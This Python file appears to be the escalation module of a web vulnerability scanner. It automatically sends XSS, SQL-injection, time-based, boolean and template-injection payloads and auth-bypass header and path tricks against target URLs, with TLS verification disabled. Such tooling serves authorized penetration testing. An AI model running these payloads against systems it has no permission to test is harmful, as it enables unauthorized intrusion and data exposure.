#!/usr/bin/env python3
"""
============================================================================
LIB: ESCALATION ENGINE
============================================================================
Implements a feedback loop that automatically escalates interesting findings
to deeper testing. When something looks suspicious, dig deeper automatically.
============================================================================
"""

import json
import time
import threading
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Callable, Optional, Set
from queue import Queue, Empty
from enum import Enum
import subprocess
import shlex

try:
    import requests
except ImportError:
    print("Error: requests library required")
    import sys
    sys.exit(1)


class FindingType(Enum):
    """Types of findings that can trigger escalation."""
    REFLECTION = "reflection"
    ERROR_DISCLOSURE = "error_disclosure"
    STATUS_CHANGE = "status_change"
    SLOW_RESPONSE = "slow_response"
    INTERESTING_PARAM = "interesting_param"
    CONTENT_DIFFERENCE = "content_difference"
    AUTH_BYPASS_HINT = "auth_bypass_hint"


class EscalationLevel(Enum):
    """Escalation depth levels."""
    QUICK = "quick"      # Fast follow-up tests
    DEEP = "deep"        # Comprehensive testing
    TARGETED = "targeted" # Exploit-specific testing


@dataclass
class Finding:
    """A finding that may trigger escalation."""
    id: str
    url: str
    param: Optional[str]
    finding_type: str
    evidence: str
    source: str  # nuclei, dalfox, anomaly_detector, etc.
    timestamp: float = field(default_factory=time.time)
    escalated: bool = False
    escalation_results: List[Dict] = field(default_factory=list)


@dataclass
class EscalationTask:
    """A task to be executed for escalation."""
    finding: Finding
    test_type: str  # xss_deep, sqli_deep, ssrf_deep, etc.
    priority: int
    payloads: List[str] = field(default_factory=list)
    command: Optional[str] = None


class EscalationRules:
    """
    Defines rules for when and how to escalate findings.
    
    Each rule: (finding_type, condition_func) -> (escalation_type, priority)
    """
    
    @staticmethod
    def get_escalation(finding: Finding) -> List[EscalationTask]:
        """Determine what escalations to perform based on finding."""
        tasks = []
        
        ftype = finding.finding_type.lower()
        
        # Reflection found -> XSS deep scan
        if ftype == 'reflection' or 'reflect' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='xss_deep',
                priority=1,
                payloads=[
                    '<script>alert(1)</script>',
                    '"><img src=x onerror=alert(1)>',
                    "'-alert(1)-'",
                    '{{constructor.constructor("alert(1)")()}}',
                    '<svg/onload=alert(1)>',
                ]
            ))
        
        # Error disclosure -> SQLi deep scan
        if 'error' in ftype or 'sql' in ftype or 'exception' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='sqli_deep',
                priority=1,
                payloads=[
                    "' OR '1'='1",
                    "' AND SLEEP(5)--",
                    "1' ORDER BY 1--",
                    "1' UNION SELECT NULL--",
                    "'; WAITFOR DELAY '0:0:5'--",
                ]
            ))
        
        # Slow response -> Time-based injection
        if 'slow' in ftype or 'time' in ftype or 'delay' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='time_based',
                priority=2,
                payloads=[
                    "' AND SLEEP(10)--",
                    "'; WAITFOR DELAY '0:0:10'--",
                    "' || pg_sleep(10)--",
                    "'|sleep(10)|'",
                    "{{range .}}{{.}}{{end}}",  # SSTI timeout
                ]
            ))
        
        # Status code change -> Auth bypass / IDOR
        if 'status' in ftype or 'auth' in ftype or 'forbidden' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='auth_bypass',
                priority=2,
                payloads=[
                    # Headers to test
                    'X-Original-URL: /admin',
                    'X-Rewrite-URL: /admin',
                    'X-Forwarded-For: 127.0.0.1',
                    # Path variations
                    '/admin..;/',
                    '/admin/.//',
                    '/ADMIN',
                ]
            ))
        
        # Interesting parameter -> Multi-vuln scan
        if 'param' in ftype or 'interesting' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='param_fuzz',
                priority=3,
            ))
        
        # Content difference -> Boolean-based tests
        if 'diff' in ftype or 'content' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='boolean_based',
                priority=2,
                payloads=[
                    ("1 AND 1=1", "1 AND 1=2"),
                    ("' AND '1'='1", "' AND '1'='2"),
                    ("{{7*7}}", "{{7*8}}"),
                ]
            ))
        
        # SSRF hints
        if 'ssrf' in ftype or 'url' in ftype or 'redirect' in ftype:
            tasks.append(EscalationTask(
                finding=finding,
                test_type='ssrf_deep',
                priority=1,
            ))
        
        return tasks


class EscalationEngine:
    """
    Main escalation engine that monitors findings and triggers deeper testing.
    """
    
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.findings: Dict[str, Finding] = {}
        self.task_queue: Queue = Queue()
        self.results: List[Dict] = []
        self.running = False
        self._worker_thread: Optional[threading.Thread] = None
        self.session = self._create_session()
        
    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        session.verify = False
        return session
    
    def add_finding(self, finding: Finding):
        """Add a finding and automatically determine escalations."""
        self.findings[finding.id] = finding
        
        # Get escalation tasks
        tasks = EscalationRules.get_escalation(finding)
        
        for task in tasks:
            self.task_queue.put(task)
            print(f"[ESCALATE] Queued {task.test_type} for {finding.url[:50]}...")
    
    def process_task(self, task: EscalationTask) -> List[Dict]:
        """Process an escalation task."""
        results = []
        
        if task.test_type == 'xss_deep':
            results = self._test_xss_deep(task)
        elif task.test_type == 'sqli_deep':
            results = self._test_sqli_deep(task)
        elif task.test_type == 'time_based':
            results = self._test_time_based(task)
        elif task.test_type == 'auth_bypass':
            results = self._test_auth_bypass(task)
        elif task.test_type == 'ssrf_deep':
            results = self._test_ssrf_deep(task)
        elif task.test_type == 'boolean_based':
            results = self._test_boolean_based(task)
        
        # Mark finding as escalated
        task.finding.escalated = True
        task.finding.escalation_results.extend(results)
        
        return results
    
    def _test_xss_deep(self, task: EscalationTask) -> List[Dict]:
        """Deep XSS testing with various contexts."""
        results = []
        url = task.finding.url
        param = task.finding.param
        
        if not param:
            return results
        
        from urllib.parse import urlparse, parse_qs, urlencode
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for payload in task.payloads:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            
            try:
                resp = self.session.get(test_url, timeout=10)
                
                # Check if payload reflects
                if payload in resp.text:
                    results.append({
                        'type': 'xss_confirmed',
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'context': self._detect_xss_context(resp.text, payload),
                        'confidence': 'high',
                    })
                    print(f"[!] XSS CONFIRMED: {param} reflects {payload[:30]}...")
                    break  # Found one, stop
                    
            except Exception as e:
                continue
        
        return results
    
    def _test_sqli_deep(self, task: EscalationTask) -> List[Dict]:
        """Deep SQLi testing with various techniques."""
        results = []
        url = task.finding.url
        param = task.finding.param
        
        if not param:
            return results
        
        from urllib.parse import urlparse, parse_qs, urlencode
        import re
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        sql_errors = [
            r"SQL syntax", r"mysql_", r"ORA-\d+", r"PostgreSQL",
            r"SQLite", r"syntax error", r"unterminated",
        ]
        
        for payload in task.payloads:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            
            try:
                resp = self.session.get(test_url, timeout=10)
                
                for pattern in sql_errors:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        results.append({
                            'type': 'sqli_error_based',
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'pattern': pattern,
                            'confidence': 'high',
                        })
                        print(f"[!] SQLi ERROR: {param} triggers SQL error")
                        break
                        
            except:
                continue
        
        return results
    
    def _test_time_based(self, task: EscalationTask) -> List[Dict]:
        """Time-based injection testing."""
        results = []
        url = task.finding.url
        param = task.finding.param
        
        if not param:
            return results
        
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for payload in task.payloads:
            test_params = {k: v[0] for k, v in params.items()}
            original = test_params.get(param, '')
            test_params[param] = original + payload
            test_url = f"{base_url}?{urlencode(test_params)}"
            
            try:
                start = time.time()
                resp = self.session.get(test_url, timeout=20)
                elapsed = time.time() - start
                
                if elapsed >= 9:  # Looking for ~10s delay
                    results.append({
                        'type': 'time_based_injection',
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'delay': elapsed,
                        'confidence': 'high',
                    })
                    print(f"[!] TIME-BASED: {param} caused {elapsed:.1f}s delay")
                    break
                    
            except requests.exceptions.Timeout:
                results.append({
                    'type': 'time_based_injection',
                    'url': test_url,
                    'param': param,
                    'payload': payload,
                    'delay': 'timeout',
                    'confidence': 'medium',
                })
                print(f"[!] TIME-BASED: {param} caused timeout")
            except:
                continue
        
        return results
    
    def _test_auth_bypass(self, task: EscalationTask) -> List[Dict]:
        """Auth bypass testing with headers and path tricks."""
        results = []
        url = task.finding.url
        
        # Try various bypass headers
        bypass_headers = [
            {'X-Original-URL': '/'},
            {'X-Rewrite-URL': '/'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
        ]
        
        try:
            # Get baseline
            baseline = self.session.get(url, timeout=10)
            baseline_status = baseline.status_code
            
            for headers in bypass_headers:
                resp = self.session.get(url, headers=headers, timeout=10)
                
                if resp.status_code != baseline_status:
                    if resp.status_code == 200 and baseline_status in [401, 403]:
                        results.append({
                            'type': 'auth_bypass',
                            'url': url,
                            'header': list(headers.keys())[0],
                            'original_status': baseline_status,
                            'bypass_status': resp.status_code,
                            'confidence': 'high',
                        })
                        print(f"[!] AUTH BYPASS: {headers} changed {baseline_status} -> {resp.status_code}")
        except:
            pass
        
        return results
    
    def _test_ssrf_deep(self, task: EscalationTask) -> List[Dict]:
        """Deep SSRF testing with various protocols and bypasses."""
        # This would integrate with the OOB handler for blind SSRF
        # For now, return empty - full implementation in 12_advanced_vulns.py
        return []
    
    def _test_boolean_based(self, task: EscalationTask) -> List[Dict]:
        """Boolean-based injection testing."""
        results = []
        url = task.finding.url
        param = task.finding.param
        
        if not param:
            return results
        
        from urllib.parse import urlparse, parse_qs, urlencode
        import difflib
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for true_payload, false_payload in task.payloads:
            test_params = {k: v[0] for k, v in params.items()}
            original = test_params.get(param, '')
            
            # True condition
            test_params[param] = original + true_payload
            true_url = f"{base_url}?{urlencode(test_params)}"
            
            # False condition
            test_params[param] = original + false_payload
            false_url = f"{base_url}?{urlencode(test_params)}"
            
            try:
                true_resp = self.session.get(true_url, timeout=10)
                false_resp = self.session.get(false_url, timeout=10)
                
                # Compare responses
                ratio = difflib.SequenceMatcher(
                    None, true_resp.text, false_resp.text
                ).ratio()
                
                # Significant difference
                if ratio < 0.95:
                    results.append({
                        'type': 'boolean_based',
                        'url': url,
                        'param': param,
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'diff_ratio': ratio,
                        'confidence': 'medium' if ratio < 0.8 else 'low',
                    })
                    print(f"[!] BOOLEAN: {param} shows {(1-ratio)*100:.1f}% difference")
                    
            except:
                continue
        
        return results
    
    def _detect_xss_context(self, html: str, payload: str) -> str:
        """Detect the context where XSS payload appears."""
        idx = html.find(payload)
        if idx == -1:
            return 'unknown'
        
        context = html[max(0, idx-50):min(len(html), idx+len(payload)+50)]
        
        if '<script' in context.lower():
            return 'script_block'
        elif 'href=' in context.lower() or 'src=' in context.lower():
            return 'attribute'
        elif 'on' in context.lower() and '=' in context:
            return 'event_handler'
        else:
            return 'html_body'
    
    def start_worker(self):
        """Start the background worker thread."""
        if self.running:
            return
        
        self.running = True
        
        def worker():
            while self.running:
                try:
                    task = self.task_queue.get(timeout=1)
                    results = self.process_task(task)
                    self.results.extend(results)
                    self.task_queue.task_done()
                except Empty:
                    continue
                except Exception as e:
                    print(f"[ERROR] Escalation worker: {e}")
        
        self._worker_thread = threading.Thread(target=worker, daemon=True)
        self._worker_thread.start()
    
    def stop_worker(self):
        """Stop the background worker."""
        self.running = False
        if self._worker_thread:
            self._worker_thread.join(timeout=5)
    
    def wait_completion(self, timeout: int = 300):
        """Wait for all tasks to complete."""
        try:
            self.task_queue.join()
        except:
            pass
    
    def save_results(self):
        """Save escalation results."""
        vuln_dir = self.output_dir / 'vulns'
        vuln_dir.mkdir(exist_ok=True)
        
        if self.results:
            with open(vuln_dir / 'escalation_findings.json', 'w') as f:
                json.dump(self.results, f, indent=2)
            
            # Save confirmed vulns separately
            confirmed = [r for r in self.results if r.get('confidence') == 'high']
            if confirmed:
                with open(vuln_dir / 'confirmed_vulns.json', 'w') as f:
                    json.dump(confirmed, f, indent=2)
                print(f"\n[!] {len(confirmed)} CONFIRMED vulnerabilities from escalation!")
        
        # Save all findings with escalation status
        with open(vuln_dir / 'all_findings.json', 'w') as f:
            json.dump([asdict(f) for f in self.findings.values()], f, indent=2)
    
    def print_summary(self):
        """Print escalation summary."""
        print("\n" + "="*60)
        print("  ESCALATION ENGINE SUMMARY")
        print("="*60)
        
        print(f"\nFindings processed: {len(self.findings)}")
        print(f"Escalation tasks: {self.task_queue.qsize() + len(self.results)}")
        print(f"Results generated: {len(self.results)}")
        
        # Group by type
        by_type = {}
        for r in self.results:
            rtype = r.get('type', 'unknown')
            by_type[rtype] = by_type.get(rtype, 0) + 1
        
        if by_type:
            print("\nFindings by Type:")
            for rtype, count in sorted(by_type.items(), key=lambda x: x[1], reverse=True):
                print(f"  • {rtype}: {count}")
        
        # Show high confidence findings
        high_conf = [r for r in self.results if r.get('confidence') == 'high']
        if high_conf:
            print(f"\n🎯 HIGH CONFIDENCE FINDINGS: {len(high_conf)}")
            for r in high_conf[:5]:
                print(f"  [{r.get('type')}] {r.get('url', '')[:60]}...")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='HybridRecon X - Escalation Engine')
    parser.add_argument('--output', '-o', required=True, help='Output directory')
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("  ESCALATION ENGINE")
    print("="*60 + "\n")
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    engine = EscalationEngine(args.output)
    
    # Load existing findings from anomaly detector
    anomaly_file = Path(args.output) / 'intel' / 'anomalies.json'
    if anomaly_file.exists():
        with open(anomaly_file, 'r') as f:
            anomalies = json.load(f)
        
        print(f"[+] Loading {len(anomalies)} anomalies for escalation...")
        
        for i, a in enumerate(anomalies):
            finding = Finding(
                id=f"anomaly_{i}",
                url=a.get('url', ''),
                param=None,  # Would need to parse from URL
                finding_type=a.get('anomaly_type', 'unknown'),
                evidence=a.get('description', ''),
                source='anomaly_detector',
            )
            engine.add_finding(finding)
    
    # Start processing
    engine.start_worker()
    
    print("\n[*] Processing escalation tasks...")
    engine.wait_completion(timeout=300)
    engine.stop_worker()
    
    engine.save_results()
    engine.print_summary()
    
    print("\n[+] Escalation complete!")
    print(f"    Results: {engine.output_dir}/vulns/escalation_findings.json\n")


if __name__ == '__main__':
    main()
